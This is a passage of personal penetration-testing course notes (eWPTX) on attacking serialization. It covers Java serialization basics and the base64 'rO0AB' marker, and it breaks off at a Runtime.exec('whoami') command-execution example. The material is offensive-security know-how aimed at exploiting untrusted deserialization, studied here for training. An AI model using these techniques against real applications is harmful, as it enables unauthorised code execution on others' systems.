<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Attacking Serialization</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.page-description {
    margin-bottom: 2em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
.select-value-color-pageGlass { background-color: undefined; }
.select-value-color-washGlass { background-color: undefined; }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="56e049a0-45a6-4f55-afb0-0f51b19102ef" class="page mono"><header><h1 class="page-title"><strong>Attacking Serialization</strong></h1><p class="page-description"></p><table class="properties"><tbody><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><svg role="graphics-symbol" viewBox="0 0 16 16" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0" class="typesMultipleSelect"><path d="M1.91602 4.83789C2.44238 4.83789 2.87305 4.40723 2.87305 3.87402C2.87305 3.34766 2.44238 2.91699 1.91602 2.91699C1.38281 2.91699 0.952148 3.34766 0.952148 3.87402C0.952148 4.40723 1.38281 4.83789 1.91602 4.83789ZM5.1084 4.52344H14.3984C14.7607 4.52344 15.0479 4.23633 15.0479 3.87402C15.0479 3.51172 14.7607 3.22461 14.3984 3.22461H5.1084C4.74609 3.22461 4.45898 3.51172 4.45898 3.87402C4.45898 4.23633 4.74609 4.52344 5.1084 4.52344ZM1.91602 9.03516C2.44238 9.03516 2.87305 8.60449 2.87305 8.07129C2.87305 7.54492 2.44238 7.11426 1.91602 7.11426C1.38281 7.11426 0.952148 7.54492 0.952148 8.07129C0.952148 8.60449 1.38281 9.03516 1.91602 9.03516ZM5.1084 8.7207H14.3984C14.7607 8.7207 15.0479 8.43359 15.0479 8.07129C15.0479 7.70898 14.7607 7.42188 14.3984 7.42188H5.1084C4.74609 7.42188 4.45898 7.70898 4.45898 8.07129C4.45898 8.43359 4.74609 8.7207 5.1084 8.7207ZM1.91602 13.2324C2.44238 13.2324 2.87305 12.8018 2.87305 12.2686C2.87305 11.7422 2.44238 11.3115 1.91602 11.3115C1.38281 11.3115 0.952148 11.7422 0.952148 12.2686C0.952148 12.8018 1.38281 13.2324 1.91602 13.2324ZM5.1084 12.918H14.3984C14.7607 12.918 15.0479 12.6309 15.0479 12.2686C15.0479 11.9062 14.7607 11.6191 14.3984 11.6191H5.1084C4.74609 11.6191 4.45898 11.9062 4.45898 12.2686C4.45898 12.6309 4.74609 12.918 5.1084 12.918Z"></path></svg></span>Tags</th><td><span class="selected-value select-value-color-red">eWPTX v2 INE</span></td></tr></tbody></table></header><div class="page-body"><h1 id="4e26f572-cadd-4091-b8e9-36d289b77076" class=""><strong>Attacking Serialization</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#attacking-serialization"></a></strong></h1><ul id="63569386-a53e-49cd-b07f-a71db7fb6e65" class="bulleted-list"><li style="list-style-type:disc">What is Serialization?</li></ul><ul id="843a2e65-c3f7-4c43-b718-649477203cc2" class="bulleted-list"><li style="list-style-type:disc">Serialization in Java</li></ul><ul id="c555d553-675b-4c9e-9b15-938e1f8c61f9" class="bulleted-list"><li style="list-style-type:disc">Serialization in PHP</li></ul><ul id="fdbd6985-7d35-4269-b47c-a06b8d7f8c86" class="bulleted-list"><li style="list-style-type:disc">.NET Serialization</li></ul><ul id="45c75a28-238f-4f62-bddc-634204df041e" class="bulleted-list"><li style="list-style-type:disc">Other Serialization</li></ul><p id="f7bb9be2-0673-4a1b-bf07-440481309267" class="">By the end of this module, u should have a better understanding of:</p><ul id="9ab3d4ee-c066-4175-bde6-6d394de6b817" class="bulleted-list"><li style="list-style-type:disc">Serialization mechanims</li></ul><ul id="0787db3f-e7cc-4a5b-819f-a100b490be34" class="bulleted-list"><li style="list-style-type:disc">How to find and exploit untrusted deserialization in common web technologies</li></ul><h2 id="e2d0e65f-fbe2-4753-8830-7c2d29830963" class=""><strong>What is Serialization</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#what-is-serialization"></a></strong></h2><p id="5c963e0f-8991-4ca6-a1d3-6e439056835c" class="">Serialization is the name of the mechanims that allows us to store the state of programmistic objects in a sequence of bytes in a reversible way. This way, an object (a variable, set of variables, or even a whole class) can be transported remotely to another program.</p><ul id="0c313ef9-3317-406a-8af6-d15eed2d003b" class="bulleted-list"><li style="list-style-type:disc">The receiving endpoint should be able to recronstruct (deserialize) the received object in an unchanged state.</li></ul><p id="71ad6dfa-60c3-4bad-af01-0b0b77f66280" class="">Used For:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ca4a984a-f216-4b05-ada0-06dca55fe161" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">→ Storing and transferring data
→ Calling remote procedures (RPC-like methods)
</code></pre><ul id="c0cdc9c4-09e0-467f-a09d-ae53c656e7b2" class="bulleted-list"><li style="list-style-type:disc">Serialized data itself is not encrypted or signed in any way.</li></ul><ul id="4d086693-dad6-4230-956f-8c3e8c8eb529" class="bulleted-list"><li style="list-style-type:disc">There might be transport protocols that utilize serialization together with compression and encryption.</li></ul><ul id="2b1ebf4c-e958-4a92-b856-9034c3dddcd2" class="bulleted-list"><li style="list-style-type:disc">So serialized data might be hidden, secured or encoutered in a plain form.</li></ul><blockquote id="82e1b190-5a3b-4c68-8ed6-2782ea76de55" class="">Serialized objects are most often encountered in web apps written in PHP, Java and .NET, but serialization is not limited to these languages only.</blockquote><h2 id="1b57f3da-7e68-495e-addc-64bf5a92903e" class=""><strong>Serialization in Java</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#serialization-in-java"></a></strong></h2><p id="4a83d45b-10ac-4837-8baa-ef4e3a382766" class="">Install JDK:</p><ul id="87329212-b35a-4375-a7b9-703cf92e4b69" class="bulleted-list"><li style="list-style-type:disc">https://www.oracle.com/technetwork/java/javase/downloads/jdk11-downloads-5066655.html</li></ul><p id="5b183886-e7f8-48ea-a8a0-23be3e0d5edf" class="">Install JRE:</p><ul id="e5224ecd-bb71-4477-a2f0-75137ce6b78c" class="bulleted-list"><li style="list-style-type:disc">https://www.oracle.com/technetwork/java/javase/overview/index.html</li></ul><ul id="942b3c7b-1236-4a4d-9af0-5568280b743d" class="bulleted-list"><li style="list-style-type:disc">javac = Java commandline compiler</li></ul><p id="73291c86-5153-4892-bb6a-19ee6956180d" class="">create two files:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6b203e92-9dab-4310-9ba9-0ba9a488abb5" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- item.java # that holds the code For a class names item
- Serialize.java # which contain the serialization logic
</code></pre><h3 id="92995a8f-f377-4199-843d-44d9041b0f98" class=""><strong>Creating Serialized Objects</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#creating-serialized-objects"></a></strong></h3><p id="ded41761-6f83-4184-ac24-5b5e070dfc19" class="">In order to use serialization, the program must import the <strong>java.io.Serializable</strong> package. Moreover, For the class to be serialized, it must implement a Serializable interface.</p><figure id="c944adb4-5999-407d-a1c8-c94dc2fecced" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/18.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/18.png"/></a></figure><ul id="1f1db3a9-63b4-410e-87c7-49e491185fd2" class="bulleted-list"><li style="list-style-type:disc"><strong>item.java</strong> is a class that has two fields: id and name</li></ul><ul id="6fb8fd8f-e1b0-4a71-bf27-68e33a2ed609" class="bulleted-list"><li style="list-style-type:disc">in real-life, serializable classes can contain many fields and methods.</li></ul><p id="4042e8d1-58c1-42b1-b0c7-730171291ce1" class="">So, in another file (in java one class should be contained in one file) that will make use of that class. First, it will create an instance of the item class, and then serialize that instance as well as save it to a file.</p><figure id="cef4bc4f-5cdc-4a83-8a27-fbaae8e57bf3" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/19.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/19.png"/></a></figure><ul id="8d2529b5-7404-4dbc-a681-71bba2aab168" class="bulleted-list"><li style="list-style-type:disc">It converts the instance of the item class to a <strong>Stream of Bytes</strong></li></ul><ul id="b0cc7e26-337d-4d14-9b9b-924671cc3da8" class="bulleted-list"><li style="list-style-type:disc">then its saved to a file caled <strong>data.ser</strong></li></ul><ul id="ebc36a5f-dcfc-4766-ae16-e9a106f3a7d6" class="bulleted-list"><li style="list-style-type:disc">the data.set is in binary format, but we can see some non-ASCII characters</li></ul><p id="e6e6ecd8-c4ba-4ea7-a4ba-bb4c0da61338" class="">The file begins with:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="619ec529-8e8a-427e-ab5b-022e42db0741" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&#x27;ac ed 00 05&#x27; bytes, which is a standard java serialized format signature
</code></pre><blockquote id="f5fe1f59-a815-4e97-8e5d-e6d7c8f1a2bc" class="">When used in web applications, its often encoded using Base64 The binary value of ac ed 00 05 equals rO0AB==</blockquote><h3 id="e7b5e09e-3ddb-45d3-a4e1-1e79da323612" class=""><strong>Deserializing Data</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#deserializing-data"></a></strong></h3><p id="080a083b-6c15-4123-ac2b-9f986bb3adf6" class="">After compilation and running the Deserialize class, we can see that the object was properly reconstructed</p><p id="cbd51249-8bad-4dc4-b9ab-2979dff6f1f0" class="">If we change anything from the data.ser file and then try to Deserialize an error occurs</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0528ca0f-bf64-45eb-a388-d2312e4d76e8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">java.lang.ClassNotFoundException: Itxm
</code></pre><figure id="de8c1414-f1ba-46e4-8c35-f15b0adcbe2d" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/20.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/20.png"/></a></figure><h3 id="3235dc48-dbd3-46b4-84f5-6892a92718dd" class=""><strong>Insecure Deserialization Conditions</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#insecure-deserialization-conditions"></a></strong></h3><p id="e3e0710d-0ae5-456f-995e-085b90e5a058" class="">When serializing and deserializing data, the deserializing endpoint must know (it must include in its classpath or import) all the classes and packages that the serialized object consists of.</p><ul id="ceb39e9a-e007-4baa-93ba-b0702fed800f" class="bulleted-list"><li style="list-style-type:disc">Basically, attacking java serialization is about passing the malicious state of an object to the deserializing endpoint.</li></ul><p id="0653ea9c-3f0d-4d3f-90b9-9495482e3f0b" class="">Example: Executing OS commands in java:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="74826536-6525-4c28-8dba-b9aff2fb2885" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Java.lang.Runtime.getRuntime.exec(&#x27;whoami&#x27;)
